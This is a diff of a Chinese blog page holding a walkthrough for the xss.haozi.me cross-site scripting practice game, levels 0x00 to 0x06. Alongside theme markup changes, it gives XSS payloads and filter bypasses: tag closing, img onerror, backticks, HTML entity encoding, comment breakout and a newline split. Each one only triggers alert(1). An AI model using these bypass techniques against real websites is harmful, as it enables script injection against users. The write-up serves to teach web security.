@@ -1,368 +1,189 @@
-
-
-<!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=auto>
-
-
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/img/fluid.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="儒道易行">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="10.xss.haozi.me通关教程0x00首先整体浏览网站  分别是xss注入点，注入后的HTML代码以及网页源码 构造常规payload： &lt;script&gt;alert(1)&lt;&#x2F;script&gt; 成功通关  0x01看到注入点是在标签中, 所以用上一题的方法是不会被解析的, 故需要去构造标签, 闭合, 就可以注入了: &lt;&#x2F;textarea&gt;&lt;script">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>xss.haozi.me通关教程 | 儒道易行</title><meta name="author" content="儒道易行"><meta name="copyright" content="儒道易行"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="10.xss.haozi.me通关教程0x00首先整体浏览网站  分别是xss注入点，注入后的HTML代码以及网页源码 构造常规payload： &lt;script&gt;alert(1)&lt;&#x2F;script&gt; 成功通关  0x01看到注入点是在标签中, 所以用上一题的方法是不会被解析的, 故需要去构造标签, 闭合, 就可以注入了: &lt;&#x2F;textarea&gt;&lt;script">
 <meta property="og:type" content="article">
 <meta property="og:title" content="xss.haozi.me通关教程">
 <meta property="og:url" content="http://rdyx0.github.io/2019/10/20/xss.haozi.me%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/index.html">
 <meta property="og:site_name" content="儒道易行">
 <meta property="og:description" content="10.xss.haozi.me通关教程0x00首先整体浏览网站  分别是xss注入点，注入后的HTML代码以及网页源码 构造常规payload： &lt;script&gt;alert(1)&lt;&#x2F;script&gt; 成功通关  0x01看到注入点是在标签中, 所以用上一题的方法是不会被解析的, 故需要去构造标签, 闭合, 就可以注入了: &lt;&#x2F;textarea&gt;&lt;script">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/aa795087993d4172831c9e99ee276446.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/51bbe92737da4211b6bc1a4a2579b86b.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/40e66026bf2545129d9b7b3e4c84718a.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/ec2f336f020d4be3ae2bba5e39abbfc4.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/86cc2b6b5d7c43928cef16efa5712cb1.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/e46abfb06acf464eb143a16ab226c34e.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/f924beb91b1548db9adcfeea58c1e9e1.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/e1f9deb877dc49e494b973b62aed161a.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/db378bad282441438b5893a0464840a1.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/e3c8a0f1db4e4e799770f031b50afff2.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/a08ee957627b444d8febb442ef0a75de.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/5184eae54b324ad9b3d8b1f656edc84f.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/da6a16be9ed942d19aa689bcbde21bb7.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/92b791aad4b9441a9e667da0dfb438f7.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/af91c883da0548268d88ace406e7aefd.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/f4cdcdb362764892a02db14e0ccabd68.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/badaf2fc3d6d483fad4e5f14f75d0034.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/8f72a6406a674360a3e203d852b9418c.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/ed5505874876496aabac72155be09a78.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/b64caa553aa0480b86832cdf364f36ac.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/0b0a177a0e5a46c3ba4164504b4f0b86.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/5333082b528b45829bcd224746c91d8c.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/77122868656d4a7ab1f58d6300bc10c4.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/41dc135e85c341068b68d534eec361a7.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/91bd633e06cd481aa6b56a63e22ffaec.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/c8aec5696909429a94d4e86df9c9b836.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/b3a72b4c110642c998ec65b67dfd5877.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/b62fcf3eae6e4eb98446c9296b7a608d.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/c5bda272b58043ec99f468440b1f72a8.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/183b85af1b514a2093b5f1163ff00811.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/d0317142dc924657896c6a5cb235b217.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/7a6028639a95475c92bd46e8cfbc00fc.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/ac0941137e7a47b1ab3106201ec5aa57.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/5773db80a16b4732a4dde27fb9036ad4.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/4ba1b7f711394a06943f15aad7c33ff3.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/b8ff56e235014cd3bcc0b512ecfae6a3.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/bdd09952675f434ba079ab1e81ede0b0.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/6f74e40bae424685b829a97701208b59.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/60d8fe39493a40429fe180f4b085fa38.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/e0e52c48d8da45cea1ff892e6cbb5a00.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/c440085de51a418faa34eed086d6f3f6.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/5c5e1ae1d54242a58ba221c3ea1c404d.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/e044338d8ced4f1fb615fb90c25f4653.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/07bf0e39403e468886debe75ec0c4962.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/1a4ddfe30f9f4a0e8b1fc487866f8c9f.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/dbd35f5cf59647e0a089fe1c47524873.png">
+<meta property="og:image" content="http://rdyx0.github.io/img/fluid.png">
 <meta property="article:published_time" content="2019-10-20T13:36:15.000Z">
 <meta property="article:modified_time" content="2023-01-01T02:45:28.889Z">
 <meta property="article:author" content="儒道易行">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/aa795087993d4172831c9e99ee276446.png">
-  
-  
-    <meta name="referrer" content="no-referrer-when-downgrade">
-  
-  
-  <title>xss.haozi.me通关教程 - 儒道易行</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
-  
-
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"rdyx0.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://rdyx0.github.io/img/fluid.png"><link rel="shortcut icon" href="/img/fluid.png"><link rel="canonical" href="http://rdyx0.github.io/2019/10/20/xss.haozi.me%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
     }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'xss.haozi.me通关教程',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-01-01 10:45:28'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
   
-
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
   
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-
-  
-<meta name="generator" content="Hexo 6.3.0"></head>
-
-
-<body>
-  
-
-  <header>
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
     
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>儒道易行</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="xss.haozi.me通关教程"></span>
-          
-        </div>
-
-        
-          
-  <div class="mt-3">
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
     
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2019-10-20 21:36" pubdate>
-          2019年10月20日 晚上
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          4.8k 字
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          40 分钟
-        
-      </span>
-    
-
-    
-    
-      
-        <span id="busuanzi_container_page_pv" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          <span id="busuanzi_value_page_pv"></span> 次
-        </span>
-        
-      
-    
-  </div>
-
-
-        
-      </div>
-
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">xss.haozi.me通关教程</h1>
-            
-            
-              <div class="markdown-body">
-                
-                <h1 id="10-xss-haozi-me通关教程"><a href="#10-xss-haozi-me通关教程" class="headerlink" title="10.xss.haozi.me通关教程"></a>10.xss.haozi.me通关教程</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a><strong>0x00</strong></h2><p>首先整体浏览网站</p>
-<p><img src="https://img-blog.csdnimg.cn/aa795087993d4172831c9e99ee276446.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/fluid.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">儒道易行</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">xss.haozi.me通关教程</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-10-20T13:36:15.000Z" title="发表于 2019-10-20 21:36:15">2019-10-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-01T02:45:28.889Z" title="更新于 2023-01-01 10:45:28">2023-01-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="xss.haozi.me通关教程"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="10-xss-haozi-me通关教程"><a href="#10-xss-haozi-me通关教程" class="headerlink" title="10.xss.haozi.me通关教程"></a>10.xss.haozi.me通关教程</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a><strong>0x00</strong></h2><p>首先整体浏览网站</p>
+<p><img src="https://img-blog.csdnimg.cn/aa795087993d4172831c9e99ee276446.png" alt="在这里插入图片描述"></p>
 <p>分别是xss注入点，注入后的HTML代码以及网页源码</p>
 <p>构造常规payload：</p>
 <p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/51bbe92737da4211b6bc1a4a2579b86b.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/51bbe92737da4211b6bc1a4a2579b86b.png" alt="在这里插入图片描述"></p>
 <h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a><strong>0x01</strong></h2><p>看到注入点是在<textarea></textarea>标签中, 所以用上一题的方法是不会被解析的, 故需要去构造标签, 闭合<textarea></textarea>, 就可以注入了:</p>
 <p><code>&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;textarea&gt;</code></p>
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/40e66026bf2545129d9b7b3e4c84718a.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/40e66026bf2545129d9b7b3e4c84718a.png" alt="在这里插入图片描述"></p>
 <p>或者, 利用error事件也可以:</p>
 <p>这个img，是用来给页面加入图片的，图片的地址就是由src来设置的，然后后面那个onerror是一个事件，就是一旦出错，就会执行里面的JavaScript代码。所以我们就把图片的地址随便写一个，然后程序出错，最后执行JavaScript代码。</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/ec2f336f020d4be3ae2bba5e39abbfc4.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/ec2f336f020d4be3ae2bba5e39abbfc4.png" alt="在这里插入图片描述"></p>
 <h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a><strong>0x02</strong></h2><p>输入常规payload：</p>
 <p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
 <p>我们发现这题的注入点是把值转化为字符串, 然后显示在输入框内, 这样前两题的标签闭合注入也就失效了</p>
-<p><img src="https://img-blog.csdnimg.cn/86cc2b6b5d7c43928cef16efa5712cb1.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/86cc2b6b5d7c43928cef16efa5712cb1.png" alt="在这里插入图片描述"></p>
 <p>可以借鉴sql注入的方法, 将前面的双引号闭合, 然后注入新的标签，上一关是闭合整个标签，这次就闭合一半，使用”&gt;把前面的标签给闭合了，然后再写自己的标签:</p>
 <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;&gt;&lt;img src=&quot;</span>x<span class="hljs-string">&quot; onerror=&quot;</span>alert(<span class="hljs-number">1</span>)<span class="hljs-string">&quot;&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/e46abfb06acf464eb143a16ab226c34e.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/e46abfb06acf464eb143a16ab226c34e.png" alt="在这里插入图片描述"></p>
 <h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a><strong>0x03</strong></h2><p>审查源码我们发现，括号, 方括号都被过滤了:</p>
-<p><img src="https://img-blog.csdnimg.cn/f924beb91b1548db9adcfeea58c1e9e1.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/f924beb91b1548db9adcfeea58c1e9e1.png" alt="在这里插入图片描述"></p>
 <p>可以用 &#96;&#96; 来代替进行绕过:</p>
 <p><code>&lt;script&gt;alert</code>1<code>&lt;/script&gt;</code></p>
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/e1f9deb877dc49e494b973b62aed161a.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/e1f9deb877dc49e494b973b62aed161a.png" alt="在这里插入图片描述"></p>
 <h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a><strong>0x04</strong></h2><p>审查源码我们发现，这题把括号、正括号和引号都过滤了:</p>
-<p><img src="https://img-blog.csdnimg.cn/db378bad282441438b5893a0464840a1.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/db378bad282441438b5893a0464840a1.png" alt="在这里插入图片描述"></p>
 <p>可以考虑用html编码来绕过, 将(1)进行html编码:</p>
-<p><img src="https://img-blog.csdnimg.cn/e3c8a0f1db4e4e799770f031b50afff2.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/e3c8a0f1db4e4e799770f031b50afff2.png" alt="在这里插入图片描述"></p>
 <p>构造payload：</p>
 <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&lt;img src=<span class="hljs-string">&quot;&quot;</span> onerror=alert&amp;#x28;&amp;#x31;&amp;#x29;&gt;<br></code></pre></td></tr></table></figure>
 
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/a08ee957627b444d8febb442ef0a75de.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/a08ee957627b444d8febb442ef0a75de.png" alt="在这里插入图片描述"></p>
 <h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a><strong>0x05</strong></h2><p>此题的注入点处于注释符之间, 而注释符的后半部被替换为一个😂, 从而防止了注释被闭合:</p>
-<p><img src="https://img-blog.csdnimg.cn/5184eae54b324ad9b3d8b1f656edc84f.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/5184eae54b324ad9b3d8b1f656edc84f.png" alt="在这里插入图片描述"></p>
 <p>注释方式有两种:</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 注释内容 --&gt;</span><br><span class="hljs-comment">&lt;!-- 注释内容 --!&gt;</span><br></code></pre></td></tr></table></figure>
 
@@ -370,9 +191,9 @@
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">--!&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-comment">&lt;!--</span><br></code></pre></td></tr></table></figure>
 
 <p>成功通关</p>
-<p><img src="https://img-blog.csdnimg.cn/da6a16be9ed942d19aa689bcbde21bb7.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/da6a16be9ed942d19aa689bcbde21bb7.png" alt="在这里插入图片描述"></p>
 <h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a><strong>0x06</strong></h2><p>这题用了正则表达式来过滤:</p>
-<p><img src="https://img-blog.csdnimg.cn/92b791aad4b9441a9e667da0dfb438f7.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/92b791aad4b9441a9e667da0dfb438f7.png" alt="在这里插入图片描述"></p>
 <p>分析regex表达式: </p>
 <p>&#x2F;auto|on.*&#x3D;|&gt;&#x2F;ig</p>
 <p>它匹配了: auto 、以on开头且以&#x3D;结尾的字符串、 &gt;</p>
@@ -381,118 +202,118 @@
 <figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;image&quot;</span> src=<span class="hljs-string">&quot;&quot;</span> onerror<br>=alert(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
 
 <p>成功通关</p>
